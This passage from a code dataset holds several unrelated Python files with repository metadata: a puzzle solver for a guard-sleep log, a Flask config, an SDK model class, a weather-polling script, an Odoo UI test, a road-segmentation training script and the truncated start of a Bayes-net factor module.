asleep\n[1518-08-21 00:00] Guard #2617 begins shift\n[1518-08-25 00:58] wakes up\n[1518-07-25 00:54] falls asleep\n[1518-11-05 00:01] falls asleep\n[1518-09-26 00:50] wakes up\n[1518-08-27 00:00] Guard #1601 begins shift\n[1518-06-22 23:50] Guard #2447 begins shift\n[1518-09-18 00:02] Guard #691 begins shift\n[1518-04-13 00:38] wakes up\n[1518-09-16 00:57] wakes up\n[1518-06-10 00:32] wakes up\n[1518-08-18 00:56] wakes up\n[1518-05-14 00:26] falls asleep\n[1518-05-29 23:59] Guard #2333 begins shift\n[1518-06-23 00:02] falls asleep\n[1518-11-13 00:22] falls asleep\n[1518-09-15 00:46] wakes up\n[1518-05-28 00:43] falls asleep\n[1518-05-22 00:55] wakes up\n[1518-03-27 00:39] wakes up\n[1518-03-07 00:39] falls asleep\n[1518-08-23 00:46] falls asleep\n[1518-07-05 00:53] wakes up\n[1518-08-05 00:37] wakes up\n[1518-05-19 00:37] falls asleep\n[1518-04-12 00:15] falls asleep\n[1518-10-14 00:00] Guard #1307 begins shift\n[1518-07-16 00:38] falls asleep\n[1518-11-03 00:02] falls asleep\n[1518-11-17 00:44] falls asleep\n[1518-09-08 00:49] wakes up\n[1518-03-08 00:17] falls asleep\n[1518-11-20 00:39] wakes up\n[1518-08-17 00:04] Guard #3203 begins shift\n[1518-03-26 00:03] falls asleep\n[1518-07-04 00:57] wakes up\n[1518-07-28 00:18] falls asleep\n[1518-04-08 00:02] Guard #1051 begins shift\n[1518-06-29 00:03] Guard #269 begins shift\n[1518-03-14 00:07] falls asleep\n[1518-03-25 00:00] Guard #2851 begins shift\n[1518-03-22 00:00] Guard #1117 begins shift\n[1518-09-03 23:59] Guard #691 begins shift\n[1518-05-12 00:40] falls asleep\n[1518-04-22 00:25] wakes up\n[1518-09-12 00:15] wakes up\n[1518-07-29 00:23] falls asleep\n[1518-09-13 00:30] falls asleep\n[1518-11-09 00:56] wakes up\n[1518-10-08 00:22] falls asleep\n[1518-10-07 00:31] wakes up\n[1518-05-18 23:56] Guard #163 begins shift\n[1518-11-19 23:59] Guard #691 begins shift\n[1518-09-08 00:31] wakes up\n[1518-10-01 00:05] falls asleep\n[1518-08-05 00:02] falls asleep\n[1518-10-03 00:22] falls asleep\n[1518-08-02 00:15] wakes up\n[1518-11-23 00:41] falls asleep\n[1518-05-29 00:30] falls asleep\n[1518-06-23 00:15] wakes up\n[1518-03-27 00:09] wakes up\n[1518-07-14 00:28] wakes up\n[1518-06-13 00:59] wakes up\n[1518-09-28 00:42] falls asleep\n[1518-03-29 00:19] falls asleep\n[1518-10-11 00:58] wakes up\n[1518-04-08 00:54] falls asleep\n[1518-03-18 00:37] falls asleep\n[1518-10-24 00:37] wakes up\n[1518-07-19 23:58] Guard #2267 begins shift\n[1518-04-24 00:47] falls asleep\n[1518-03-22 00:32] wakes up\n[1518-07-22 00:55] falls asleep\n[1518-09-14 00:00] Guard #2153 begins shift\n[1518-04-08 00:35] wakes up\n[1518-07-22 00:48] wakes up\n[1518-09-02 00:40] falls asleep\n[1518-11-19 00:51] wakes up\n[1518-09-24 00:04] falls asleep\n[1518-10-02 00:01] Guard #163 begins shift\n[1518-03-16 00:20] wakes up\n[1518-06-26 00:46] falls asleep\n[1518-05-05 00:02] falls asleep\n[1518-05-09 00:59] wakes up\n[1518-03-30 00:37] wakes up\n[1518-06-12 23:57] Guard #353 begins shift\n[1518-09-09 23:59] Guard #353 begins shift\n[1518-11-18 00:17] falls asleep\n[1518-07-05 00:00] Guard #691 begins shift\n[1518-09-29 00:12] falls asleep\n[1518-03-31 23:51] Guard #163 begins shift\n[1518-04-09 00:45] falls asleep\n[1518-07-21 00:47] wakes up\n[1518-07-14 00:53] falls asleep\n[1518-10-13 00:56] wakes up\n[1518-04-09 23:59] Guard #2267 begins shift\n[1518-08-10 00:52] wakes up\n[1518-04-09 00:55] wakes up\n[1518-09-04 00:51] wakes up\n[1518-08-18 00:45] wakes up\n[1518-08-05 00:59] wakes up\n[1518-03-26 00:47] wakes up\n[1518-03-16 00:26] falls asleep\n[1518-04-10 00:57] wakes up\n[1518-04-15 00:21] falls asleep\n[1518-06-22 00:35] falls asleep\n[1518-05-02 00:54] wakes up\n[1518-10-21 00:04] Guard #2267 begins shift\n[1518-08-15 23:56] Guard #353 begins shift\n[1518-09-08 00:00] Guard #349 begins shift\n[1518-10-14 23:56] Guard #2399 begins shift\n[1518-07-30 00:53] wakes up\n[1518-10-06 00:00] Guard #349 begins shift\n[1518-03-15 00:48] wakes up\n[1518-03-27 00:15] falls asleep\n[1518-03-10 00:12] falls asleep\n[1518-06-01 00:02] Guard #3559 begins shift\n[1518-07-11 00:00] Guard #1307 begins shift\n[1518-05-03 00:20] falls asleep\n[1518-11-07 00:29] falls asleep\n[1518-06-22 00:40] wakes up\n[1518-06-29 23:56] Guard #1091 begins shift\n[1518-10-06 00:08] falls asleep\n[1518-04-21 00:57] wakes up\n[1518-11-13 00:00] Guard #509 begins shift\n[1518-05-19 00:31] wakes up\n[1518-05-01 00:09] falls asleep\n[1518-10-11 00:01] Guard #3203 begins shift\n[1518-08-03 00:28] falls asleep\n[1518-08-01 23:50] Guard #349 begins shift\n[1518-04-05 23:59] Guard #1091 begins shift\n[1518-09-09 00:37] falls asleep\n[1518-05-08 00:56] wakes up\n[1518-08-21 00:37] falls asleep\n[1518-10-27 00:05] falls asleep\n[1518-09-25 00:06] falls asleep\n[1518-08-08 00:57] wakes up\n[1518-07-13 00:59] wakes up\n[1518-09-10 23:58] Guard #1307 begins shift\n[1518-06-07 00:04] Guard #1051 begins shift\n[1518-06-27 00:47] wakes up\n[1518-09-04 00:18] falls asleep\n[1518-10-05 00:42] wakes up\n[1518-06-29 00:42] wakes up\n[1518-08-19 00:49] wakes up\n[1518-09-01 00:47] wakes up\n[1518-06-25 00:53] wakes up\n[1518-09-15 00:52] falls asleep\n[1518-08-09 00:47] falls asleep\n[1518-10-23 00:24] falls asleep'''\n\nfrom collections import defaultdict\n\nrows = input_data.split('\\n')\n\n#improved solution\nguards = defaultdict(int) # guards = {ID: minutes_asleep}\nsleeping = defaultdict(list) # sleeping = {guards: [(start, end)]}\n\nguard = 0\nstart = 0\n\nfor row in sorted(rows):\n\n    parts = row.split(' ')\n    time = int(parts[1][3:-1])\n    if parts[2] == 'Guard':\n        guard = int(parts[3][1:])\n    elif parts[2] == 'falls':\n        start = time\n    else:\n        guards[guard] += time - start\n        sleeping[guard].append((start, time))\n\n\n(guard, time) = max(guards.items(), key=lambda i: i[1])\n(minute, count) = max([(minute, sum(1 for (start, end) in sleeping[guard] if start <= minute < end)) for minute in xrange(60)], key=lambda i: i[1])\nprint minute, guard\nprint 'Answer 1:', minute * guard\n\n(guard, minute, count) = max([(guard, minute, sum( 1 for (start, end) in sleeping[guard] if start <= minute < end)) for minute in xrange(60) for guard in sleeping], key=lambda i: i[2])\n\nprint guard, minute, count\nprint 'Answer 2:', guard * minute\n\n\n\n\n\n\n\n\n\n#\n# reached = {}\n#\n# sum = 0\n#\n# most  = 0\n#\n# i = 0\n#\n# asleep_during_minute = []\n# for i in xrange(61):\n#     asleep_during_minute.append({})\n#\n# rows.sort()\n# print rows\n#\n# minutes_asleep = 0\n# current_guard = 0\n# sleep_time = 0\n# guards_sleep = {}\n# for row in rows:\n#     parts = row.split(' ')\n#     if parts[2] == 'Guard':\n#         if current_guard in guards_sleep:\n#             guards_sleep[current_guard][0] += minutes_asleep\n#         else:\n#             guards_sleep[current_guard] = [minutes_asleep, {}]\n#         for i in xrange(minutes_asleep):\n#             if i + int(sleep_time) < 60:\n#                 if current_guard in asleep_during_minute[int(sleep_time) + i]:\n#                     asleep_during_minute[int(sleep_time) + i][current_guard] += 1\n#                 else:\n#                     asleep_during_minute[int(sleep_time) + i][current_guard] =  1\n#             if int(sleep_time) + i in guards_sleep[current_guard][1]:\n#                 guards_sleep[current_guard][1][int(sleep_time) + i] += 1\n#             else:\n#                 guards_sleep[current_guard][1][int(sleep_time) + i] = 1\n#\n#         minutes_asleep = 0\n#         current_guard = parts[3][1:]\n#     elif parts[2] == 'falls':\n#         sleep_time = parts[1][3:-1]\n#     else:\n#         minutes_asleep += int(parts[1][3:-1]) - int(sleep_time)\n#\n# max_guard = '349'\n#\n# for guard, val in guards_sleep.items():\n#     print guard\n#     if guards_sleep[guard] > guards_sleep[max_guard]:\n#         max_guard = guard\n#\n# max_min = 0\n# max_val = 0\n# for i in xrange(60):\n#     if i in guards_sleep[max_guard][1]:\n#         if guards_sleep[max_guard][1][i] > max_val:\n#             max_min = i\n#             max_val = guards_sleep[max_guard][1][i]\n#\n#\n# print max_guard\n# # print guards_sleep[max_guard]\n#\n# print max_min\n# print int(max_min) * int(max_guard)\n#\n# # print asleep_during_minute[6]\n# print len(asleep_during_minute)\n# # asleep_during_minute[max_guard] = 0\n# index = 0\n# minute = 0\n# val = 0\n# for i in xrange(60):\n#     # print i\n#     for guard, val2 in asleep_during_minute[i].items():\n#         # print guard\n#         if val2 > val:\n#             print 'larger'\n#             index = guard\n#             minute = i\n#             val = val2\n# print index\n# print max_guard\n# print minute\n# print int(minute) * int(index)\n#\n# # print 2399 * 46 # wrong 110354\n#\n# minute, guard, count = max([(minute, guard[0], guard[1]) for minute in range(60) for guard in asleep_during_minute[minute].items()], key=lambda i: i[2])\n# print minute, guard, count\n"}
{"blob_id": "23c9d48a6209d7f5344eb8efbdbc394aacb6b4f7", "directory_id": "8d471dd00d4d1abb0e0bed535c7e7c9e23813da2", "path": "/config.py", "content_id": "ba7062cac5b7148eae5b0d85f920424be4d03f27", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "nlajunior/api-monitor", "snapshot_id": "19b5947a6b3f1b21fb21b879f6f2ee855563e467", "revision_id": "adbd3733ae298164746dd0ff499535ee46e3a5ad", "branch_name": "refs/heads/master", "visit_date": "2023-01-29 03:20:28.590398", "revision_date": "2020-12-14 20:16:32", "committer_date": "2020-12-14 20:16:32", "github_id": "302084426", "star_events_count": "0", "fork_events_count": "1", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "1345", "extension": "py", "content": "import os\nimport random, string, json\n\nwith open('/home/nljunior/projetos/api-monitor/config.json') as config_file:\n    config = json.load(config_file)\n\nclass Config(object):\n    CSRF_ENABLED = True\n    SECRET = config.get('SECRET')\n    SQLALCHEMY_DATABASE_URI = config.get('SQLALCHEMY_DATABASE_URI')\n    TEMPLATE_FOLDER = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'templates')\n    ROOT_DIR = os.path.dirname(os.path.abspath(__file__))\n    APP = None\n    SENDGRID_API_KEY = 'API_KEY'\n\nclass DevelopmentConfig(Config):\n    TESTING = False\n    DEBUG = True\n    IP_HOST = 'localhost'\n    PORT_HOST = 5000\n    URL_MAIN = 'http://%s:%s/' % (IP_HOST, PORT_HOST)\n\nclass TestingConfig(Config):\n    TESTING = True\n    DEBUG = True\n    IP_HOST = '0.0.0.0' # Aqui geralmente \u00e9 um IP de um servidor na nuvem e n\u00e3o o endere\u00e7o da m\u00e1quina local\n    PORT_HOST = 8000\n    URL_MAIN = 'http://%s:%s/' % (IP_HOST, PORT_HOST)\n\nclass ProductionConfig(Config):\n    DEBUG = False\n    TESTING = False\n    IP_HOST = 'localhost' # Aqui geralmente \u00e9 um IP de um servidor na nuvem e n\u00e3o o endere\u00e7o da m\u00e1quina local\n    PORT_HOST = 80\n    URL_MAIN = 'http://%s:%s/' % (IP_HOST, PORT_HOST)\n\napp_config = {\n    'development': DevelopmentConfig(),\n    'testing': TestingConfig(),\n    'production': ProductionConfig()\n}\n\napp_active= config.get('FLASK_ENV')"}
{"blob_id": "fc9da05b724f3cc401ad8e99bf801480a47d99ec", "directory_id": "187a6558f3c7cb6234164677a2bda2e73c26eaaf", "path": "/jdcloud_sdk/services/bgw/models/LocationSpec.py", "content_id": "69b6f58d03ef8610c8cc7e5db8003c726aa8d3d1", "detected_licenses": "['Apache-2.0']", "license_type": "permissive", "repo_name": "jdcloud-api/jdcloud-sdk-python", "snapshot_id": "4d2db584acc2620b7a866af82d21658cdd7cc227", "revision_id": "3d1c50ed9117304d3b77a21babe899f939ae91cd", "branch_name": "refs/heads/master", "visit_date": "2023-09-04 02:51:08.335168", "revision_date": "2023-08-30 12:00:25", "committer_date": "2023-08-30 12:00:25", "github_id": "126276169", "star_events_count": "18", "fork_events_count": "36", "gha_license_id": "Apache-2.0", "gha_event_created_at": "2023-09-07 06:54:49", "gha_created_at": "2018-03-22 03:47:02", "gha_language": "Python", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "1533", "extension": "py", "content": "# coding=utf8\n\n# Copyright 2018 JDCLOUD.COM\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n#\n# NOTE: This class is auto generated by the jdcloud code generator program.\n\n\nclass LocationSpec(object):\n\n    def __init__(self, locationCode=None, locationPortSpecCode=None, locationISPCode=None):\n        \"\"\"\n        :param locationCode: (Optional) \u4e13\u7ebf\u521b\u5efa\u7684\u5730\u57df\u7f16\u7801;\u53ea\u5728\u521b\u5efa\u81ea\u52a9\u8fde\u63a5\u65f6\u751f\u6548\uff0c\u901a\u8fc7\u8c03\u7528[describeLocations](../Location/describeLocations.md)\u63a5\u53e3\u83b7\u53d6\n        :param locationPortSpecCode: (Optional) \u4e13\u7ebf\u63a5\u5165\u7aef\u53e3\u89c4\u683c\u4ee3\u7801\uff0c\u5728\u521b\u5efa\u81ea\u52a9\u8fde\u63a5\u548c\u6258\u7ba1\u4e13\u7ebf\u65f6\u751f\u6548.\u901a\u8fc7\u8c03\u7528[describeLocations](../Location/describeLocations.md)\u63a5\u53e3\u83b7\u53d6\n        :param locationISPCode: (Optional) \u4e13\u7ebf\u63a5\u5165\u8fd0\u8425\u5546\u4ee3\u7801\uff0c\u53ea\u5728\u521b\u5efa\u81ea\u52a9\u8fde\u63a5\u65f6\u751f\u6548.\u901a\u8fc7\u8c03\u7528[describeLocations](../Location/describeLocations.md)\u63a5\u53e3\u83b7\u53d6\n        \"\"\"\n\n        self.locationCode = locationCode\n        self.locationPortSpecCode = locationPortSpecCode\n        self.locationISPCode = locationISPCode\n"}
{"blob_id": "928548fb2d833d453e61cff84be4211554b9f0a2", "directory_id": "79e19976e927e56711c88df7bcc8a542b9b2cb67", "path": "/weather.py", "content_id": "fd1422c43e1c427a6862fc8ca32061f9faf59a20", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "Hong-SY/2020CapstoneDesign_1", "snapshot_id": "94939a312337832c0f5d287eb69370c333cbaf0d", "revision_id": "6e2615ef709dc14fb7d4c651bed9817516a837e2", "branch_name": "refs/heads/master", "visit_date": "2021-03-26 12:30:51.414183", "revision_date": "2020-04-11 03:42:32", "committer_date": "2020-04-11 03:42:32", "github_id": "247704508", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "585", "extension": "py", "content": "#-*- coding:utf-8 -*-\nimport sys\nimport requests\nimport time\nimport xml.etree.ElementTree as ETree\n\nreload(sys)\nsys.setdefaultencoding('utf-8')\n\nrssURL = 'http://www.kma.go.kr/wid/queryDFSRSS.jsp?zone=4136025000'\ngraphURL = 'http://ec2-3-19-61-182.us-east-2.compute.amazonaws.com:8001/insert/?temp='\n\nwhile True:\n    res = requests.get(rssURL)\n    root = ETree.fromstring(res.text)\n    first_data = root.find('channel').find('item').find('description').find('body').find('data')\n    temp = first_data.find('temp').text\n\n    req = requests.get(graphURL + str(temp))\n    time.sleep(600)\n"}
{"blob_id": "1a95c984ef4b479eb1dafc39164ee5b439a1e1ac", "directory_id": "e0045eec29aab56212c00f9293a21eb3b4b9fe53", "path": "/project/tests/test_project_ui.py", "content_id": "08ef944eea3a788fc496ef58c731307bf53c4486", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "tamam001/ALWAFI_P1", "snapshot_id": "a3a9268081b9befc668a5f51c29ce5119434cc21", "revision_id": "402ea8687c607fbcb5ba762c2020ebc4ee98e705", "branch_name": "refs/heads/master", "visit_date": "2020-05-18 08:16:50.583264", "revision_date": "2019-04-30 14:43:46", "committer_date": "2019-04-30 14:43:46", "github_id": "184268686", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "400", "extension": "py", "content": "# Part of ALWAFI. See LICENSE file for full copyright and licensing details.\n\nimport odoo.tests\n\n\n@odoo.tests.tagged('post_install', '-at_install')\nclass TestUi(odoo.tests.HttpCase):\n\n    def test_01_project_tour(self):\n        self.phantom_js(\"/web\", \"odoo.__DEBUG__.services['web_tour.tour'].run('project_tour')\", \"odoo.__DEBUG__.services['web_tour.tour'].tours.project_tour.ready\", login=\"admin\")\n"}
{"blob_id": "b7bc2422b7963627c10c023954247c09cc2867c9", "directory_id": "8dd26e452e2126dcb111061a56248936bf7d984f", "path": "/main.py", "content_id": "65e9120354a3a02c24261530d98017ec78f9cdbb", "detected_licenses": "['MIT']", "license_type": "permissive", "repo_name": "bt22dr/CarND-Semantic-Segmentation", "snapshot_id": "9bd8c3f746db3198ef904e3569ee5e6bad92072e", "revision_id": "b71b318462a05012d0d2f5baa380755924a5363c", "branch_name": "refs/heads/master", "visit_date": "2020-04-29 02:30:51.088417", "revision_date": "2019-03-16 08:02:16", "committer_date": "2019-03-16 08:02:16", "github_id": "175771375", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "MIT", "gha_event_created_at": "2019-03-15 07:35:35", "gha_created_at": "2019-03-15 07:35:33", "gha_language": "Python", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "10734", "extension": "py", "content": "#!/usr/bin/env python3\nimport os.path\nimport tensorflow as tf\nimport helper\nimport warnings\nfrom distutils.version import LooseVersion\nimport project_tests as tests\n\n\n# Check TensorFlow Version\nassert LooseVersion(tf.__version__) >= LooseVersion('1.0'), 'Please use TensorFlow version 1.0 or newer.  You are using {}'.format(tf.__version__)\nprint('TensorFlow Version: {}'.format(tf.__version__))\n\n# Check for a GPU\nif not tf.test.gpu_device_name():\n    warnings.warn('No GPU found. Please use a GPU to train your neural network.')\nelse:\n    print('Default GPU Device: {}'.format(tf.test.gpu_device_name()))\n\n\ndef load_vgg(sess, vgg_path):\n    \"\"\"\n    Load Pretrained VGG Model into TensorFlow.\n    :param sess: TensorFlow Session\n    :param vgg_path: Path to vgg folder, containing \"variables/\" and \"saved_model.pb\"\n    :return: Tuple of Tensors from VGG model (image_input, keep_prob, layer3_out, layer4_out, layer7_out)\n    \"\"\"\n    # TODO: Implement function\n    #   Use tf.saved_model.loader.load to load the model and weights\n    vgg_tag = 'vgg16'\n    vgg_input_tensor_name = 'image_input:0'\n    vgg_keep_prob_tensor_name = 'keep_prob:0'\n    vgg_layer3_out_tensor_name = 'layer3_out:0'\n    vgg_layer4_out_tensor_name = 'layer4_out:0'\n    vgg_layer7_out_tensor_name = 'layer7_out:0'\n    \n    tf.saved_model.loader.load(sess, [vgg_tag], vgg_path)\n    graph = tf.get_default_graph()\n\n    image_input = graph.get_tensor_by_name(vgg_input_tensor_name)\n    keep_prob = graph.get_tensor_by_name(vgg_keep_prob_tensor_name)\n    layer3_out = graph.get_tensor_by_name(vgg_layer3_out_tensor_name)\n    layer4_out = graph.get_tensor_by_name(vgg_layer4_out_tensor_name)\n    layer7_out = graph.get_tensor_by_name(vgg_layer7_out_tensor_name)\n\n    return image_input, keep_prob, layer3_out, layer4_out, layer7_out\n\ntests.test_load_vgg(load_vgg, tf)\n\n\ndef layers(vgg_layer3_out, vgg_layer4_out, vgg_layer7_out, num_classes):\n    \"\"\"\n    Create the layers for a fully convolutional network.  Build skip-layers using the vgg layers.\n    :param vgg_layer3_out: TF Tensor for VGG Layer 3 output\n    :param vgg_layer4_out: TF Tensor for VGG Layer 4 output\n    :param vgg_layer7_out: TF Tensor for VGG Layer 7 output\n    :param num_classes: Number of classes to classify\n    :return: The Tensor for the last layer of output\n    \"\"\"\n    # TODO: Implement function\n    conv_1x1 = tf.layers.conv2d(vgg_layer7_out, 1024, kernel_size=1, padding='SAME', \n                                kernel_regularizer=tf.contrib.layers.l2_regularizer(1e-3))\n\n    upsample_1 = tf.layers.conv2d_transpose(conv_1x1, 512, \n                                            kernel_size=4, strides=2, padding='SAME', \n                                            kernel_regularizer=tf.contrib.layers.l2_regularizer(1e-3))\n    upsample_1 = tf.add(upsample_1, vgg_layer4_out, name=\"skip1\")\n    \n    upsample_2 = tf.layers.conv2d_transpose(upsample_1, 256, \n                                            kernel_size=4, strides=2, padding='SAME', \n                                            kernel_regularizer=tf.contrib.layers.l2_regularizer(1e-3))\n    upsample_2 = tf.add(upsample_2, vgg_layer3_out, name=\"skip2\")\n    \n    output = tf.layers.conv2d_transpose(upsample_2, num_classes, \n                                        kernel_size=16, strides=(8, 8), padding='SAME', \n                                        kernel_regularizer=tf.contrib.layers.l2_regularizer(1e-3))\n    # tf.Print(output, [tf.shape(output)])\n\n    return output\ntests.test_layers(layers)\n\n\ndef optimize(nn_last_layer, correct_label, learning_rate, num_classes):\n    \"\"\"\n    Build the TensorFLow loss and optimizer operations.\n    :param nn_last_layer: TF Tensor of the last layer in the neural network\n    :param correct_label: TF Placeholder for the correct label image\n    :param learning_rate: TF Placeholder for the learning rate\n    :param num_classes: Number of classes to classify\n    :return: Tuple of (logits, train_op, cross_entropy_loss)\n    \"\"\"\n    # TODO: Implement function    \n    logits = tf.reshape(nn_last_layer, (-1, num_classes))\n    optimizer = tf.train.AdamOptimizer(learning_rate=learning_rate)\n    cross_entropy_loss = tf.reduce_mean(\n        tf.nn.softmax_cross_entropy_with_logits(logits=logits, labels=correct_label))\n    train_op = optimizer.minimize(cross_entropy_loss)\n    return logits, train_op, cross_entropy_loss\ntests.test_optimize(optimize)\n\n\n\ndef train_nn2(sess, epochs, batch_size, get_batches_fn, \n             train_op, cross_entropy_loss, \n             input_image, correct_label, keep_prob, logits, learning_rate):\n    \"\"\"\n    Train neural network and print out the loss during training.\n    :param sess: TF Session\n    :param epochs: Number of epochs\n    :param batch_size: Batch size\n    :param get_batches_fn: Function to get batches of training data.  Call using get_batches_fn(batch_size)\n    :param train_op: TF Operation to train the neural network\n    :param cross_entropy_loss: TF Tensor for the amount of loss\n    :param input_image: TF Placeholder for input images\n    :param correct_label: TF Placeholder for label images\n    :param keep_prob: TF Placeholder for dropout keep probability\n    :param learning_rate: TF Placeholder for learning rate\n    \"\"\"\n    # TODO: Implement function\n    sess.run(tf.global_variables_initializer())\n    for epoch in range(epochs): \n        for step, (image, label) in enumerate(get_batches_fn(batch_size)): \n            sess.run([train_op], \n                     feed_dict={input_image: image,\n                                correct_label: label, \n                                keep_prob: 0.5, \n                                learning_rate: 1e-3})\n            if step % 20 == 0 or step == 1:\n                np_loss = sess.run([cross_entropy_loss], \n                                    feed_dict={input_image: image,\n                                               correct_label: label, \n                                               keep_prob: 0.5, \n                                               learning_rate: 1e-3})\n                print(\"Epoch:\", epoch, \", Step\", step, \", Loss\", np_loss)\n        if epoch % 10 == 0:\n            helper.save_inference_samples(\n                \"./CarND-Semantic-Segmentation/tmp_out\", \n                \"./CarND-Semantic-Segmentation/data_test\", \n                sess, (160, 576), logits, keep_prob, input_image)\n                \n                \ndef train_nn(sess, epochs, batch_size, get_batches_fn, \n             train_op, cross_entropy_loss, \n             input_image, correct_label, keep_prob, learning_rate):\n    \"\"\"\n    Train neural network and print out the loss during training.\n    :param sess: TF Session\n    :param epochs: Number of epochs\n    :param batch_size: Batch size\n    :param get_batches_fn: Function to get batches of training data.  Call using get_batches_fn(batch_size)\n    :param train_op: TF Operation to train the neural network\n    :param cross_entropy_loss: TF Tensor for the amount of loss\n    :param input_image: TF Placeholder for input images\n    :param correct_label: TF Placeholder for label images\n    :param keep_prob: TF Placeholder for dropout keep probability\n    :param learning_rate: TF Placeholder for learning rate\n    \"\"\"\n    # TODO: Implement function\n    sess.run(tf.global_variables_initializer())\n    for epoch in range(epochs): \n        for step, (image, label) in enumerate(get_batches_fn(batch_size)): \n            sess.run([train_op], \n                     feed_dict={input_image: image,\n                                correct_label: label, \n                                keep_prob: 0.5, \n                                learning_rate: 1e-3})\n            if step % 20 == 0 or step == 1:\n                np_loss = sess.run([cross_entropy_loss], \n                                    feed_dict={input_image: image,\n                                               correct_label: label, \n                                               keep_prob: 0.5, \n                                               learning_rate: 1e-3})\n                print(\"Epoch:\", epoch, \", Step\", step, \", Loss\", np_loss)\ntests.test_train_nn(train_nn)\n\n\ndef run():\n    num_classes = 2\n    image_shape = (160, 576)  # KITTI dataset uses 160x576 images\n    data_dir = '/data'\n    runs_dir = './runs'\n    tests.test_for_kitti_dataset(data_dir)\n\n    # Download pretrained vgg model\n    helper.maybe_download_pretrained_vgg(data_dir)\n\n    # OPTIONAL: Train and Inference on the cityscapes dataset instead of the Kitti dataset.\n    # You'll need a GPU with at least 10 teraFLOPS to train on.\n    #  https://www.cityscapes-dataset.com/\n\n    correct_label = tf.placeholder(tf.float32, shape = [None, None, None, num_classes], name=\"correct_label\")\n    learning_rate = tf.placeholder(tf.float32, name=\"learning_rate\")\n    with tf.Session() as sess:\n        # Path to vgg model\n        vgg_path = os.path.join(data_dir, 'vgg')\n        # Create function to get batches\n        get_batches_fn = helper.gen_batch_function(os.path.join(data_dir, 'data_road/training'), image_shape)\n\n        # OPTIONAL: Augment Images for better results\n        #  https://datascience.stackexchange.com/questions/5224/how-to-prepare-augment-images-for-neural-network\n\n        # TODO: Build NN using load_vgg, layers, and optimize function\n        input_image, keep_prob, layer3_out, layer4_out, layer7_out = load_vgg(sess, vgg_path)\n        nn_last_layer = layers(layer3_out, layer4_out, layer7_out, num_classes)\n        logits, train_op, cross_entropy_loss = optimize(\n            nn_last_layer, correct_label, learning_rate, num_classes)\n\n        # TODO: Train NN using the train_nn function\n        train_nn(sess=sess, epochs=51, batch_size=32, \n                 get_batches_fn=get_batches_fn, \n                 train_op=train_op,\n                 cross_entropy_loss=cross_entropy_loss, \n                 input_image=input_image, \n                 correct_label=correct_label, \n                 keep_prob=keep_prob, \n                 learning_rate=learning_rate)\n#         train_nn2(sess=sess, epochs=51, batch_size=32, \n#                  get_batches_fn=get_batches_fn, \n#                  train_op=train_op,\n#                  cross_entropy_loss=cross_entropy_loss, \n#                  input_image=input_image, \n#                  correct_label=correct_label, \n#                  keep_prob=keep_prob, \n#                  logits=logits,\n#                  learning_rate=learning_rate)\n\n        # TODO: Save inference data using helper.save_inference_samples\n        helper.save_inference_samples(runs_dir, data_dir, sess, image_shape, logits, keep_prob, input_image)\n\n        # OPTIONAL: Apply the trained model to a video\n\n# TODO: train_nn2 -> train_nn\nif __name__ == '__main__':\n    run()\n"}
{"blob_id": "c6f8a99ee529dea4ad700f2e487a7d1c9723e44e", "directory_id": "044c062dd7baa7d7d7c7be8b04c90634a9dd45f0", "path": "/cs188/bayesNets2/factorOperations.py", "content_id": "48878699e367edb7ea0969f744a354efd7e5ede6", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "kevinsfr/class", "snapshot_id": "a62b3276199d1e8316e5eb50a0e96f47966e34e8", "revision_id": "c9a625268c5d9e35520c3bab84d839b014880233", "branch_name": "refs/heads/master", "visit_date": "2020-03-24 16:37:31.810130", "revision_date": "2018-07-30 06:01:38", "committer_date": "2018-07-30 06:01:38", "github_id": "142830576", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "11084", "extension": "py", "content": "# factorOperations.py\n# -------------------\n# Licensing Information:  You are free to use or extend these projects for\n# educational purposes provided that (1) you do not distribute or publish\n# solutions, (2) you retain this notice, and (3) you provide clear\n# attribution to UC Berkeley, including a link to http://ai.berkeley.edu.\n# \n# Attribution Information: The Pacman AI projects were developed at UC Berkeley.\n# The core projects and autograders were primarily created by John DeNero\n# (denero@cs.berkeley.edu) and Dan Klein (klein@cs.berkeley.edu).\n# Student side autograding was added by Brad Miller, Nick Hay, and\n# Pieter Abbeel (pabbeel@cs.berkeley.edu).\n\n\nfrom bayesNet import Factor\nimport operator as op\nimport util\nfrom sets import Set\n\ndef joinFactorsByVariableWithCallTracking(callTrackingList=None):\n\n\n    def joinFactorsByVariable(factors, joinVariable):\n        \"\"\"\n        Input factors is a list of factors.\n        Input joinVariable is the variable to join on.\n\n        This function performs a check that the variable that is being joined on \n        appears as an unconditioned variable in only one of the input factors.\n\n        Then, it calls your joinFactors on all of the factors in factors that \n        contain that variable.\n\n        Returns a tuple of \n        (factors not joined, resulting factor from joinFactors)\n        \"\"\"\n\n        if not (callTrackingList is None):\n            callTrackingList.append(('join', joinVariable))\n\n        currentFactorsToJoin =    [factor for factor in factors if joinVariable in factor.variablesSet()]\n        currentFactorsNotToJoin = [factor for factor in factors if joinVariable not in factor.variablesSet()]\n\n        # typecheck portion\n        numVariableOnLeft = 